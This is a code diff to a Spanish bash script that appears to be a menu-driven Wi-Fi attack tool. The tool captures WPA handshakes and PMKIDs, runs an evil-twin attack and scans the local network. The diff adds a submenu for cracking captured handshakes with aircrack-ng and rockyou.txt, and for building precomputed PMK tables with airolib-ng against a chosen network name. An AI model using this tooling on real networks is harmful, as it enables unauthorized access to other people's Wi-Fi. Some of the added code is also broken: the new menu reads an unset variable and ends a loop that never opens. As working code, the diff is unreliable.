@@ -80,6 +80,19 @@ handshake_ataque() {
 		echo -e "${redColour}\n [!] No se ha capturado el Handshake"
 	fi
 }
+# salida
+salir() {
+	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
+	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	sudo /etc/init.d/networking start > /dev/null 2>&1
+	sudo /etc/init.d/networking restart > /dev/null 2>&1
+	sudo systemctl start NetworkManager > /dev/null 2>&1
+	ifconfig $tar up > /dev/null 2>&1
+	sudo rm Handshake* > /dev/null 2>&1
+	tput cnorm
+	exit
+}
+
 # 2) ataque
 pkmid_ataque() {
 	clear
@@ -110,9 +123,8 @@ pkmid_ataque() {
 	fi
 }
 # 3) ataque
-fuerza_ataque() {
-	clear
-	echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
+fuerza_.cap() {
+	clear; echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
 	sleep 1
 	echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
 	$cleancolor
@@ -121,6 +133,52 @@ fuerza_ataque() {
 	tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
+
+rainbowtaibles() {
+	clear; echo -e "\n${yellowColour}[*] Iniciando..."
+	read -p "[?] Ruta del diccionario: " ruta
+	mkdir Diccionario hasheado
+	cd Diccionario hasheado
+	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
+	test -f dicc-hasheado
+	if [ "$(echo $?)" -eq 0 ]; then
+		read -p "[?] Nombre o essid de la red: " ap 
+		echo "$ap" > essid.lst
+		airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
+		airolib-ng dicc-hasheado --clean all 
+		read -p "[?] Cuanto quieres que dure el proceso de hasheo?: " seg
+		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
+		batch_PID=$!
+		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
+	else
+		echo -e "\n${redColour}[!] No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
+		sleep 2
+	fi
+}
+
+menuforce() {
+	echo -e "${yellowColour}\n1) Ataque Fuerza bruta (.cap)"
+	echo -e "2) Crear diccionario hasheado (Rainbow taibles)"
+	echo -e "3) Salir"
+	case $force in 
+	1)
+	fuerza_.cap
+	;;
+	2)
+	rainbowtaibles
+	;;
+	3)
+	salir
+	;;
+	*)
+	echo -e "${redColour}\n[!] Opción inválida"
+	sleep 2
+	;;
+	esac 
+	done
+}
+
+
 # 4) ataque
 evil_ataque() {
 	clear; echo -e "\n${grayColour}[*] Iniciando Ataque evilTrust by S4vitar..."
@@ -152,18 +210,6 @@ scanner() {
 	nmap -sP -Pn ${ipnmap}.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
 	echo -e "\n---------------------------------------------------"
 	read -p "Enter para salir: "
-}
-# salida
-salir() {
-	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
-	airmon-ng stop ${tar}mon > /dev/null 2>&1
-	sudo /etc/init.d/networking start > /dev/null 2>&1
-	sudo /etc/init.d/networking restart > /dev/null 2>&1
-	sudo systemctl start NetworkManager > /dev/null 2>&1
-	ifconfig $tar up > /dev/null 2>&1
-	sudo rm Handshake* > /dev/null 2>&1
-	tput cnorm
-	exit
 }
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
@@ -217,7 +263,7 @@ else
 							echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show ${tar}mon | grep "Current MAC" | awk '{print $3}')"
 							echo -e "${yellowColour}\n1) Ataque Handshake"
 							echo -e "2) Ataque PMKID"
-							echo -e "3) Ataque de fuerza bruta"
+							echo -e "3) Menu de ataques con fuerza bruta"
 							echo -e "4) Ataque evilTrust (S4vitar)"
 							echo -e "5) Scanner de la red local"
 							echo -e "6) Salir"
